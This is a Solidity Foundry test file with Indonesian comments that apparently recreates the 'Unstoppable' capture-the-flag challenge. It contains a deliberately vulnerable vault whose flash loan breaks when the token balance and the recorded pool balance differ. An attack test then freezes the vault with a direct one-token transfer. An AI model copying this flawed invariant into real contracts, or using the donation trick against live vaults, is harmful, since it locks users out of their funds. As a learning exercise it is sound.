// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// 1. MOCK TOKEN (Sederhana)
contract DamnValuableToken {
    mapping(address => uint256) public balanceOf;
    
    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Not enough funds");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// 2. THE TARGET (Unstoppable Vault)
contract UnstoppableVault {
    DamnValuableToken public token;
    uint256 public poolBalance; 

    constructor(address _token) {
        token = DamnValuableToken(_token);
    }

    function deposit(uint256 amount) external {
        token.mint(address(this), amount); 
        poolBalance += amount; 
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = token.balanceOf(address(this));

        // --- BUG ---
        // "Apakah Uang Fisik == Catatan Buku?"
        // Kalau beda 1 perak saja, REVERT!
        if (balanceBefore != poolBalance) {
            revert("Assertion Failed: Balance mismatch");
        }
    }
}

// 3. ATTACK SCRIPT
contract UnstoppableTest is Test {
    UnstoppableVault vault;
    DamnValuableToken token;
    address attacker = address(0xBAD); // Alamat asal
    address user = address(123);       // Alamat user biasa (Fix Error Baris 61)

    function setUp() public {
        token = new DamnValuableToken();
        vault = new UnstoppableVault(address(token));

        // Setup Awal: Vault punya 1 Juta Token
        token.mint(address(vault), 1_000_000 ether);
        // Kita curangi storage slotnya biar poolBalance = 1 Juta juga (Sinkron)
        vm.store(address(vault), bytes32(uint256(1)), bytes32(uint256(1_000_000 ether))); 
        
        // Attacker punya modal 10 token
        token.mint(attacker, 10 ether);
    }

    function test_Unstoppable_Attack() public {
        vm.startPrank(attacker);

        console.log("--- SEBELUM SERANGAN ---");
        console.log("Vault Pool Balance (Catatan):", vault.poolBalance());
        console.log("Vault Actual Balance (Fisik):", token.balanceOf(address(vault)));
        
        // -----------------------------------------------------
        // SERANGAN DIMULAI!
        // Kita transfer token LANGSUNG ke vault.
        // Ini akan menaikkan 'Actual Balance', tapi 'Pool Balance' tidak berubah.
        // Akibatnya: Actual != Pool.
        // -----------------------------------------------------
        
        token.transfer(address(vault), 1 ether);
        
        console.log("--- SETELAH SERANGAN ---");
        console.log("Vault Pool Balance (Catatan):", vault.poolBalance());     // Tetap 1,000,000
        console.log("Vault Actual Balance (Fisik):", token.balanceOf(address(vault))); // Jadi 1,000,001 (BEDA!)

        vm.stopPrank();

        // VERIFIKASI:
        // Coba jadi user biasa, harusnya gagal pinjam uang sekarang.
        vm.startPrank(user);
        
        vm.expectRevert("Assertion Failed: Balance mismatch");
        vault.flashLoan(100 ether);
        
        vm.stopPrank();
    }
}